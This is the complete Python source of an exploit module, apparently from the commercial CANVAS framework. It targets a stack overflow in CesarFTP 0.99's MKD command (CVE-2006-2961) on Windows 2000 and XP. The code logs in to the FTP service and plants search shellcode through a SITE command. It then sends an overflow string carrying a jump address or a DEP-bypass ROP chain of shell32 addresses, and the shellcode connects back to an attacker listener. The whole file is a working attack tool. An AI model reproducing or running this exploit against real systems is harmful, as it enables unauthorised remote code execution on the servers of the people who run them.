#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

# System imports
import sys
import time
import os
import getopt
import socket

# CANVAS path appends
if "." not in sys.path: sys.path.append(".")

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine

# Documentation
NAME="CesarFTP"
DESCRIPTION="CesarFTP Stack Overflow on MKD command"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="ACLogic"
DOCUMENTATION["Repeatability"]="This exploit is non repeatable..."
DOCUMENTATION["CVE Name"] = "CVE-2006-2961"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2961"
DOCUMENTATION['CVSS'] = 7.5

#DOCUMENTATION["URL"]="http://secunia.com/advisories/21097"
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP" ]

NOTES="""

"""

CHANGELOG="""

"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=21
        self.host=""
        self.shellcode=""
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        self.badstring="\x00/\\\r\n@ "
        self.setVersions()
        self.version=1
        self.searchbadstring = self.badstring
        self.name=NAME
        self.USEMSGPEEK=0
        self.username = "anonymous"
        self.password = "test@test.com"
        return

    def setVersions(self):
        self.versions={}
        #name, jmp esi, shellcode
        self.versions[0] = ( "Autoversion (N/A)", 0x0 ) 
        self.versions[1] = ( "CesarFTP  v0.99", 0x7FFD9001) #  0x717753af ) 
        self.versions[2] = ( "Cesar FTP v0.99 XP SP2 (DEP)", 0x41424344)

    def neededListenerTypes(self):
        if self.USEMSGPEEK:
            return []
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        if self.callback:
            host=self.callback.ip
            port=self.callback.port
        #rawshellcode = self.createInjectToSelf( host, port ) 
        #rawshellcode = self.createHeapSafeInjectIntoProcess( self.badstring, host, port )
        #rawshellcode = * 8  + self.createWin32Shellcode( self.badstring, host, port)
        self.createWin32SearchShellcode( host, port )
        return self.shellcode
    
    def test(self):
        """
        
        """
        return self.bannerchecktest({"CesarFTP 0.99": 1})
    
    def run(self):
        self.host     = self.target.interface
        self.port     = int(self.argsDict.get("port", self.port))
        self.username = self.argsDict.get("username", self.username)
        self.password = self.argsDict.get("password", self.password)

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic versioning enabled.")
            self.test()
            if self.version==0:
                self.log("Could not find version!")
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        try:
            #we're a bit over generous with this try:accept
            
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        
            # s2: allocate the shellcode
            s2=self.gettcpsock()
            s2.connect((self.host, self.port))
            data=s2.recv(1000)
            s2.sendall("USER toca\r\n")
            s2.recv(1000)
            s2.sendall("SITE COCACOCA" +  self.shellcode +  "\r\n")

            data = s.recv( 1000 )
            self.log( "Recieved banner: %s" % prettyprint(data) )
            s.set_timeout(20)
            s.sendall( "USER %s\r\n" % self.username )
            data = s.recv( 1000 )
            self.log("USER command sent (%s)" % data)
            s.sendall( "PASS %s\r\n" % self.password )
            data = s.recv( 1000 )
            self.log("PASS command sent (%s)" % data)
            
            s.sendall( self.makesploit() )

            data=s.recv(1000)
            self.log( "Recieved %s" % prettyprint(data) )
            s.close()

            
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            #self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            #return 0

        time.sleep(3)
        ret=self.ISucceeded()
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return ret
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
    def makesploit(self):
        """
        Construct the attack
        """
        ver = self.versions[self.version] 
        
        #self.log("Size of shellcode: 0x%x" % len(self.encodedsearchcode) )

        if  self.version == 1:
            stack = intel_order( ver[ 1 ] ) + self.encodedsearchcode 

        elif self.version == 2:
            # addies:
            # 0x7cb1dc65   mov al,1               # shell32
            # 0x7c8d5468   retn 0x38              # shell32
            # 0x7cb5ba82   push esp/pop ebp/retn  # shell32
            # 0x7c8d5468   retn 0x38              # shell32
            # 0x7c91d3f8   anti-dep
            # 0x7d10e25e   pop ecx/jmp esp        # shell32
            # ... execute shellcode: MOV EAX, ESP | ADD AX, 2E0 | JMP ESP
            # and that follows to the encode search code
            code = "\x8b\xc4\x66\x05\xe0\x02\xff\xe0" 

            stack = intel_order(0x7cb1dc65) + intel_order(0x7c9d5468) + intel_order(0x7cb5ba82) + "B" * 0x38 +  intel_order(0x7c9d5468) 
            stack+= intel_order(0x7d10e25e)+ intel_order(0x7c91d3f8) + "\xff\xff\xff\xff" + code + "D" * 0x10 + self.encodedsearchcode
            

        #self.log( "Encode search code: %d" % len(self.encodedsearchcode) )
        sploitstring = "MKD " + "\n" * 671 + "AAA" +  stack + "\r\n"

        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

